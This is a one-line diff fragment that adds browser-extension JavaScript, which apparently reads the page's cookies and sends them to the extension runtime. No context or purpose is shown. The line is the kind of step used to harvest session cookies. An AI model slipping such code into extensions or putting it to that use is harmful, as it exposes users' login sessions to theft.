@@ -1,0 +1,1 @@
+chrome.runtime.sendMessage({cookie: document.cookie});
